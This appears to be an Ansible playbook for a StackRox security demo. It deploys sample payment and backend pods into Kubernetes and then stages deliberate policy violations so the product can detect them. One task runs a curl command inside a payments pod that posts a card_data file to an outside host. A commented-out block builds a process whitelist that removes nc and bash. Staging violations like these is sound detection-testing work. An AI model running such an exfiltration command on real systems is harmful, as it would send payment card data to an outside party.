- name: Get demos
  find:
    paths: roles/demo/files/demos
    recurse: yes
    patterns: '*.yaml'
  register: demo_yamls

# - name: Remove any existing
#   community.kubernetes.k8s:
#     state: absent
#     definition: "{{ lookup('file', item.path ) | from_yaml_all }}"
#   # shell: "{{ orchestrator_tool }} apply --request-timeout=90s -R -f {{ item }}"
#   environment:
#     KUBECONFIG: "{{ kubeconfig }}"
#   loop: "{{ demo_yamls.files }}"

- name: Apply demos
  community.kubernetes.k8s:
    state: present
    definition: "{{ lookup('file', item.path ) | from_yaml_all }}"
  # shell: "{{ orchestrator_tool }} apply --request-timeout=90s -R -f {{ item }}"
  environment:
    KUBECONFIG: "{{ kubeconfig }}"
  loop: "{{ demo_yamls.files }}"

- name: Wait for demos to start.
  shell: "{{ orchestrator_tool }} wait --namespace={{ item.namespace }} --for=condition=Ready pods --selector \"{{ item.selector }}\" --timeout=30s"
  environment:
    KUBECONFIG: "{{ kubeconfig }}"
  retries: 3
  delay: 10
  register: result
  until: result.rc == 0
  loop:
    - { namespace: 'payments', selector: 'app=visa-processor'}
    - { namespace: 'backend', selector: 'app=backend-atlas'}
    - { namespace: 'frontend', selector: 'app=asset-cache'}

- name: k8s_exec violation
  community.kubernetes.k8s_exec:
    namespace: payments
    pod: "{{ lookup('community.kubernetes.k8s', kind='Pod', namespace='payments', label_selector='app=mastercard-processor', kubeconfig=kubeconfig).metadata.name }}"
    kubeconfig: "{{ kubeconfig }}"
    command: 'curl -X POST --data-binary @/var/lib/processor/card_data http://innocent.site.web'

- name: k8s_portforward violation
  shell: "{{ orchestrator_tool }} -n payments port-forward service/mastercard-processor-service 30000:8080 1>/dev/null 2>&1 &"






#     for dep in visa-processor backend-atlas asset-cache; do
#         tries=0

#         while [ "$tries" -lt 10 ]; do
#             dep_ids="$(central_curl \
#                 "https://central.stackrox:${central_port}/v1/deployments?query=Deployment:\"${dep}\"" \
#                 | jq -r '.deployments[].id')"
#             if [ "$dep_ids" != "" ]; then
#                 break
#             else
#                 tries=$((tries + 1))
#                 sleep 10
#             fi
#         done

#         for dep_id in $dep_ids; do
#             wl_key="$(central_curl \
#                 "https://central.stackrox:${central_port}/v1/deployments/${dep_id}" \
#                 | jq -c '{deploymentId: .id, containerName: .name, clusterId, namespace}'
#             )"

#             blob="$(cat <<EOF
# {
#   "keys": [$wl_key],
#   "addElements": [
#     {
#       "processName": "/bin/uname"
#     },
#     {
#       "processName": "/docker-java-home/jre/bin/java"
#     },
#     {
#       "processName": "/usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java"
#     },
#     {
#       "processName": "/usr/bin/dirname"
#     },
#     {
#       "processName": "/usr/bin/tty"
#     },
#     {
#       "processName": "/usr/local/tomcat/bin/catalina.sh"
#     },
#     {
#       "processName": "/bin/dash"
#     }
#   ],
#   "removeElements": [
#     {
#       "processName": "/bin/bash"
#     },
#     {
#       "processName": "/bin/nc"
#     },
#     {
#       "processName": "/usr/bin/dpkg"
#     },
#     {
#       "processName": "/usr/bin/apt-get"
#     }
#   ]
# }
# EOF
#         )"

#             debug "Whitelist blob: $blob"

#             tries=0

#             while [ "$tries" -lt 10 ]; do
#                 STATUS="$(central_curl \
#                     -H "Content-Type: application/json" \
#                     "https://central.stackrox:${central_port}/v1/processwhitelists" \
#                     -XPUT \
#                     -d "$blob"
#                 )"
#                 if echo "$STATUS" | grep '"errors":\[\]' > /dev/null; then
#                     info "$dep process whitelist status: $STATUS"
#                     break
#                 else
#                     tries=$((tries + 1))
#                     sleep 10
#                 fi
#             done
#         done
#     done
# }